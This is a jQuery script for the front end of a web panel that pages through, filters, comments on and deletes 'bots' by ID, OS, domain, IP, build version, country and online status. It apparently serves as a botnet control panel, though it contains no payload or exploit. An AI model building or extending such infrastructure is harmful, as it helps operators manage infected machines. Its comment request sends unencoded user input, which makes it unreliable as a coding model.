var botsDataPagination;
var getBotsData;
var searchBotsData;

$(document).ready(function(){
    var $botsDataContainer = $('#bots-data-container');
    var $botsDataPaginationView = $('#bots-data-pagination');
    var botsDataPageSize = 10;
    if ($botsDataContainer.length && $botsDataPaginationView.length) {
        botsDataPagination = createCustomP({
            $paginationView: $botsDataPaginationView,
            url: '/bots/get_bots_data',
            pageSize: botsDataPageSize,
            $dataContainers: [$botsDataContainer],
            filter: $('#bots_filter').length ? $('#bots_filter').val() : '',
            additional_filters: getBotsFiltersJson(),
            callbackAfter: () => {
                addCommentListener();
            }
        });
    }

    searchBotsData = function(isAdditionalSearch) {
        if (isAdditionalSearch === true && $('#bots_filter').length) {
            $('#bots_filter').val('');
        } else {
            $('#bots_filter_bot_id').val('');
            $('#bots_filter_os').val('');
            $('#bots_filter_domain_name').val('');
            $('#bots_filter_ip').val('');
            $('#bots_filter_build_version').val('');
            $('#bots_filter_country').val('');
            $('#bots_filter_layer_ip').val('');
            $('#bots_filter_online').prop('checked', false);
        }
        getBotsData();
    };

    getBotsData = function() {
        $botsDataPaginationView.pagination('destroy');
        botsDataPagination = createCustomP({
            $paginationView: $botsDataPaginationView,
            url: '/bots/get_bots_data',
            pageSize: botsDataPageSize,
            $dataContainers: [$botsDataContainer],
            filter: $('#bots_filter').length ? $('#bots_filter').val() : '',
            additional_filters: getBotsFiltersJson(),
            callbackAfter: () => {
                addCommentListener();
            }
        });
    };

    function getBotsFiltersJson()
    {
        const filters = [
            {
                name: 'botid',
                value: $('#bots_filter_bot_id').val()
            },
            {
                name: 'os',
                value: $('#bots_filter_os').val()
            },
            {
                name: 'domain_name',
                value: $('#bots_filter_domain_name').val()
            },
            {
                name: 'ip',
                value: $('#bots_filter_ip').val()
            },
            {
                name: 'build_version',
                value: $('#bots_filter_build_version').val()
            },
            {
                name: 'country',
                value: $('#bots_filter_country').val()
            },
            {
                name: 'layer_ip',
                value: $('#bots_filter_layer_ip').val()
            },
            {
                name: 'online',
                value: $('#bots_filter_online').is(':checked')
            }
        ];
        console.log(filters);
        return JSON.stringify(Object.assign({}, filters));
    }
});

function addCommentListener() {
    $(".our-comment").on("click", function() {
        console.log($(this).attr('id'));
        check_comment($(this).attr('id'));
    });
}


function check_comment(id) {
    var comment = $('#' + id);
    var saveTimer;
    var bot_id = id.replace(/[^-0-9]/gim,'');
    comment.on('input',function(e){
        clearTimeout(saveTimer);
        saveTimer = setTimeout(function() { ajaxSaveComment(bot_id, comment.val()); }, 50);
    }).trigger('input');
}

function ajaxSaveComment(id, comment) {
    console.log("id: " + id + " comment: " + comment);
    $.ajax({
        type: "get",
        url: "/bots/comment_update",
        data: "id="+id+"&comment="+comment,
        headers: {"Content-Type" : "application/json; charset=utf-8"}
    });
}

function deleteBot(id) {
    $.ajax({
        type: "get",
        url: "/bots/bot_delete",
        data: "id="+id,
        headers: {"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8"},
        success: function (response) {
            if (response === '1') {
                $.jGrowl('Bot deleted', { sticky: false, theme: 'growl-success', header: 'Success!', life: 3000 });
                $("#row_"+id).hide(1000);
            } else {
                $.jGrowl('Bot did not deleted', { sticky: false, theme: 'growl-success', header: 'Success!', life: 3000 });
            }

        }
    });
}